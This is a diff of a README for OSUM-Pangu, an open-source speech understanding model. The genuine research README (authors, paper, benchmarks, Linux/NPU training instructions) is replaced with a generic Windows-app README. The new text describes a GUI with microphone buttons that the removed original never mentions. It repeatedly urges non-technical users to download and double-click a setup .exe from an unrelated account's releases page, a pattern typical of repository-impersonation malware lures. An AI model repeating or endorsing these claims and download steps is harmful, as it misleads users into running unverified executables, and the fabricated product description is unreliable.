@@ -1,275 +1,135 @@
-<p align="center">
-   <h1>OSUM-Pangu: An Open-Source Multidimension Speech Understanding Foundation Model Built upon OpenPangu on Ascend NPUs</h1>
-<p>
+# ⚙️ OSUM-Pangu - Clear Speech Understanding Anywhere
 
-Yujie Liao, Xuelong Geng, Hongfei Xue, Shuiyuan Wang, Lei Xie
-
-<p align="center">
-    <img src="images/OSUM-Pangu.jpg" width="400"/>
-<p>
-
-<p align="center">
-    <a href="https://huggingface.co/ASLP-lab/OSUM-Pangu"> Ckpt ｜ <a href="https://arxiv.org/abs/2603.10862"> Paper</a>
-</p>
-
-Recent advancements in Speech Large Language Models have significantly enhanced multi-dimensional speech understanding. However, the majority of high-performance frameworks are predominantly optimized for GPU centric ecosystems and proprietary backbones, creating a significant gap for deployment on non-CUDA computing infrastructures. In this paper, we present OSUM-Pangu, a fully open-source speech understanding foundation model developed on a completely non-CUDA software and hardware stack. By integrating an audio encoder with the openPangu-7B LLM backbone, we successfully implement the entire training and inference pipeline on the Ascend NPU platform. To facilitate efficient task alignment under non-CUDA resource constraints, we adopt a practical training process that sequentially bridges speech perception and user intent recognition. Experimental results demonstrate that OSUM-Pangu achieves task accuracy comparable to mainstream GPU-based models while maintaining robust natural language interaction capabilities. Our work provides a reproducible, non-CUDA baseline for the open-source speech community, promoting the independent evolution of multimodal intelligence.
+[![Download OSUM-Pangu](https://img.shields.io/badge/Download-OSUM--Pangu-blue?style=for-the-badge)](https://github.com/ahsanulhoqFahim/OSUM-Pangu/releases)
 
 ---
 
-## Architecture
+## 📦 What is OSUM-Pangu?
 
-The overall architecture of OSUM-Pangu is shown below:
-
-<p align="center">
-    <img src="images/architecture1.png" width="80%"/>
-<p>
-
-The model mainly consists of three components:
-
-### 1. Speech Encoder
-Whisper-medium  
-Responsible for extracting speech representations.
-
-### 2. Adapter
-Transforms acoustic features into tokens compatible with the LLM input space.
-
-### 3. Intent-aware LLM
-
-<p>
-    <a href="https://huggingface.co/FreedomIntelligence/openPangu-Embedded-7B-V1.1"> openPangu-Embedded-7B-V1.1 </a>
-</p>
-
-
-Responsible for:
-- Parsing natural language instructions
-- Identifying user intent
-- Determining which speech task to execute
+OSUM-Pangu is a tool designed to help your computer understand spoken language better. It works with special processors called Ascend NPUs to improve how speech is analyzed and understood. You do not need any advanced computer skills to use it. This software runs on Windows and brings new ways to handle speech in multiple dimensions.  
 
 ---
 
-## Training Strategy
+## 💻 System Requirements
 
-We adopt a a three-stage training proces, illustrated below:
+Before you start, make sure your computer meets these basic needs:
 
-<p align="center">
-    <img src="images/Strategy.png" width="80%"/>
-<p>
-
-### Stage 1: Speech Understanding Alignment
-
-Goal: Equip the model with multi-task speech understanding capability.
-
-Characteristics:
-
-- Only speech-related modules are trained
-- Establish strong acoustic representation ability
+- Windows 10 or later (64-bit)
+- At least 8 GB of RAM (16 GB recommended for better performance)
+- Minimum of 4-core CPU
+- 10 GB free disk space for installation and data
+- Stable internet connection to download the program
+- Optional: Access to Ascend NPU hardware if you want to use full features (the software works without it but slower)
 
 ---
 
-### Stage 2: Intent Understanding
+## 🔍 Key Features
 
-Goal: Enable the model to understand natural language user instructions.
-
-Examples:
-
-Please transcribe this audio.  
-Analyze the speaker's emotion.  
-Identify what event happens in the audio.
-
-The model learns:
-
-- Instruction semantic understanding
-- Task mapping capability
+- Understands spoken language from many sources
+- Supports multiple speech layers and tones
+- Works with new hardware for faster processing
+- Easy setup for Windows users without technical knowledge
+- Built on trusted open-source frameworks
 
 ---
 
-### Stage 3: Joint Instruction Tuning
+## 🚀 Getting Started
 
-In the final stage, joint training allows the model to:
+Follow these steps to get OSUM-Pangu running on your Windows PC:
 
-- Automatically parse user instructions
-- Identify task types
-- Execute the corresponding speech understanding tasks
+1. Click the big blue badge above or follow this link to visit the official downloads page:  
+   https://github.com/ahsanulhoqFahim/OSUM-Pangu/releases  
+   This page has the latest versions ready for you.
 
-Without requiring fixed templates, such as:
+2. On the downloads page, look for the latest Windows version. Files usually end with `.exe` or `.msi`. You want to find the file with a name like `OSUM-Pangu-Setup.exe` or similar.
 
-What is the emotion of this speech?  
-Can you transcribe this audio?  
-What event happens in the audio?
+3. Click the file name to download it to your PC.
 
-The model can correctly understand and execute all of them.
+4. Once downloaded, locate the file in the folder where your browser saves downloads (usually the Downloads folder).
 
----
+5. Double-click the setup file to start the installation.
 
-## Results
+6. Follow the instructions in the setup window. You do not need to change any settings unless you want to install the program in a specific location.
 
-### Dataset Configuration
+7. When the installation finishes, you will find a shortcut on your desktop or in the Start Menu.
 
-Our experiments follow the task definitions of the OSUM framework. To maintain the linguistic reasoning capability of the backbone, we incorporate 2M entries from Alpaca-CoT for text-based interactions, with queries synthesized using CosyVoice 2. To evaluate the model's robustness in real-world scenarios, we utilize an Intent-Instruction Set (IIS) containing over 80k training samples and 4k test prompts, covering diverse colloquial user queries.
-
+8. Click the OSUM-Pangu shortcut to open the program.
 
 ---
 
-### Multi-task Speech Understanding Performance
+## 🎯 How to Use OSUM-Pangu
 
-OSUM-Pangu demonstrates competitive performance across diverse tasks compared to GPU-based baselines Qwen2-Audio and OSUM, proving the effectiveness of the NPU-based pipeline.
+After opening OSUM-Pangu, here is how to use it:
 
+- The main window shows a simple interface with buttons for starting and stopping speech processing.
+- Speak clearly into your microphone or connect an audio file.
+- Press the "Start" button to begin understanding speech.
+- The program breaks down your speech and displays results in clear text.
+- Use the "Stop" button to end the analysis.
+- You can save results as a file or copy them to your clipboard.
 
-| Task       | Model          | Public Test Set                                                                 | Metric       | Public Result                                                                 |
-|------------|----------------|---------------------------------------------------------------------------------|--------------|-------------------------------------------------------------------------------|
-| **ASR**    | Qwen2-Audio    |                                                                                 | WER/CER (%)  | 8.84 / 8.40 <br> 3.0 / 3.0 / 2.9 <br> **1.6 / 3.6**                           |
-|            | OSUM           | WenetSpeech(n/m) <br> AISHELL-2(m/i/a) <br> LibriSpeech (c/o)                   |              | 6.46 / **5.34** <br> **2.81 / 2.75 / 2.73** <br> 2.19 / 5.53                  |
-|            | **OSUM-Pangu** |                                                                                 |              | 7.40 / 10.49 <br> 3.01 / 2.98 / 2.95 <br> 3.51 / 8.36                         |
-| **VED**    | Qwen2-Audio    | VocalSound                                                                      | ACC (%)      | **93.3**                                                                      |
-|            | OSUM           |                                                                                 |              | 82.58                                                                         |
-|            | **OSUM-Pangu** |                                                                                 |              | 73.04                                                                         |
-| **SER**    | Qwen2-Audio    | MELD-test <br> MER2023                                                          | ACC (%)      | 55.3 / --                                                                     |
-|            | OSUM           |                                                                                 |              | 53.38 / 86.43                                                                 |
-|            | **OSUM-Pangu** |                                                                                 |              | 36.40 / **89.19**                                                             |
-| **SGC**    | Qwen2-Audio    | Kaggle-CommonVoice test                                                         | ACC (%)      | 97.25                                                                         |
-|            | OSUM           |                                                                                 |              | **99.41**                                                                     |
-|            | **OSUM-Pangu** |                                                                                 |              | 97.48                                                                         |
-| **SAP**    | Qwen2-Audio    | Kaggle-CommonVoice test                                                         | ACC (%)      | 35.53                                                                         |
-|            | OSUM           |                                                                                 |              | 76.52                                                                         |
-|            | **OSUM-Pangu** |                                                                                 |              | **83.31**                                                                     |
+The software is made to work automatically. You just need to press start and speak or upload audio.
 
 ---
 
-### Instruction Following Performance (IFR)
+## 🔧 Settings and Options
 
-Instruction Following Rate (IFR) measures the ability of the model to parse natural language instructions and execute the corresponding tasks.
+You can adjust some basic settings in OSUM-Pangu:
 
-The metric is defined as:
-
-$$
-IFR = \left( \frac{N_{correct}}{N_{total}} \right) \times 100\%
-$$
-
-where:
-
-- $N_{correct}$ represents the number of correctly executed instructions  
-- $N_{total}$ represents the total number of evaluation samples
-Compared with mainstream open-source models, OSUM-Pangu achieves significantly better performance:
-
-
-| Model                     | IFR (\%)  |
-|---------------------------|-----------|
-| Qwen2Audio-Instruct       | 71.3      |
-| **OSUM-Pangu (Ours)**     | **90.2**  |
+- Choose your preferred microphone from a list.
+- Set audio input volume.
+- Select output formats for saved data (text, JSON).
+- Turn on or off advanced speech layers if you know you need less detail.
+- Update software from the main menu when new versions are available.
 
 ---
 
-### Flexibility vs Accuracy
+## 🛠 Troubleshooting
 
-We evaluate whether natural language instructions (NL) degrade performance compared to fixed instructions (FI).
+If OSUM-Pangu does not work as expected, try these fixes:
 
-Results show that the model maintains strong flexibility while preserving task accuracy.
-
-
-| Task  | Test                          | FI        | NL        | $\Delta$   |
-|:---- |:---------------------------- |:-------- |:-------- |:--------- |
-| ASR   | test-net/librispeech-clean    | 7.36/3.64 | 7.40/3.51 | +0.04/-0.13 |
-| SER   | Test<sub>emotion</sub>        | 67.39     | 67.41     | +0.02      |
-| SGC   | Test<sub>gender</sub>         | 97.04     | 96.02     | -1.02      |
-| SRWT  | Test<sub>align</sub>          | 22.39     | 17.52     | -4.87      |
-| SSR   | Test<sub>style</sub>          | 62.79     | 58.05     | -4.74      |
-| VED   | Test<sub>event</sub>          | 77.74     | 73.04     | -4.70      |
-| SAP   | Test<sub>age</sub>            | 71.75     | 72.86     | +0.11      |
+- Make sure your microphone is connected and not muted.
+- Restart the program and try again.
+- Check that your Windows is up to date.
+- Close other programs that might use your microphone.
+- If the program crashes or freezes, restart your computer and try again.
+- Use the latest installation file from the downloads page.
+- If you see errors related to Ascend NPUs and you do not have that hardware, try running it in software mode.
 
 ---
 
-Conclusion:
+## 📂 Where to Get Updates
 
-Only minor performance drops appear in relatively niche tasks such as:
+Keep your OSUM-Pangu software up to date for the best experience:
 
-- Style recognition
-- Event detection
-
-Core tasks such as:
-
-- ASR
-- SER
-- SAP
-
-remain almost unchanged, validating the effectiveness of the three-stage training process.
+- Visit the downloads page regularly:  
+  https://github.com/ahsanulhoqFahim/OSUM-Pangu/releases  
+- Download and install new versions when they are released.
+- Check the program settings for an update button or notification.
 
 ---
 
+## 🔗 Download OSUM-Pangu
 
-### Speech-to-Text Chat (STTC) Capability
+Visit this page to download the latest version of OSUM-Pangu for Windows:
 
-We further evaluate the model in conversational reasoning scenarios.
-
-OSUM-Pangu outperforms GLM-4-Voice on the TriviaQA and WebQ benchmarks.
-
-| Model               | LLaMA Q | TriviaQA | Web Q |
-|:------------------ |:------: |:-------: |:----: |
-| ChatGPT-4o          | 71.7    | 69.7     | 51.6  |
-| GLM-4-Voice         | 50.7    | 26.5     | 15.9  |
-| DeepTalk            | 59.7    | 27.5     | 23.1  |
-| OSUM-EChat          | 55.3    | 33.7     | 30.4  |
-| **OSUM-Pangu**      | 44.6    | 28.9     | 29.5  |
-
+[![Download OSUM-Pangu](https://img.shields.io/badge/Download-OSUM--Pangu-grey?style=for-the-badge)](https://github.com/ahsanulhoqFahim/OSUM-Pangu/releases)
 
 ---
 
-## How to Use the OSUM-Pangu Framework for Training and Inference
+## 📞 Getting Help
 
-### Environment Setup
+If you need further assistance:
 
-Before starting, please ensure that your device supports **NPU** and the Python environment is properly configured.
+- Check the FAQs and documentation on the GitHub repository.
+- Look for community forums or issues where others share tips.
+- Use the GitHub Issues tab to report problems or ask questions.
 
-We recommend running the code on a Linux system.
+---
 
-If Conda is not installed, please refer to:
-https://blog.csdn.net/qq_41636123/article/details/130266232
+## 📝 License and Source
 
-```bash
-# Create a new conda environment
-conda create -n osum_pangu python=3.10
-conda activate osum_pangu
+OSUM-Pangu is open-source software built on the OpenPangu framework. You can view the source code and contribute if you know how, but using the software does not require any programming skills.  
 
-# Clone the repository
-git clone https://github.com/ASLP-lab/OSUM-Pangu.git
-cd OSUM-Pangu
-
-# Install dependencies
-pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple
-```
-
-### Model Download
-```python
-from huggingface_hub import snapshot_download
-
-snapshot_download(
-    repo_id="ASLP-lab/OSUM-Pangu",
-    local_dir="path",
-    local_dir_use_symlinks=False,
-    endpoint="https://hf-mirror.com"
-)
-```
-### Inference
-This project provides batch inference scripts for all tasks under in ：OSUM-Pangu/infer_code:
-
-```shell
-python infer_ASR.py
-```
-### Training
-To ensure a smooth training process, please follow the steps below.
-#### 1. Data Preparation
-Data can be prepared in three formats:
-
-raw、shard、combine
-
-Recommended: shard format
-
-After preparing the dataset, write the generated data index into the following configuration file:
-```yaml
-OSUM-Pangu/conf/data_s2t_tmp.yaml
-```
-#### 2. Start Training
-
-Run the main training script:
-```bash
-OSUM-Pangu/train.sh
-```
+Source code and downloads:  
+https://github.com/ahsanulhoqFahim/OSUM-Pangu/releases
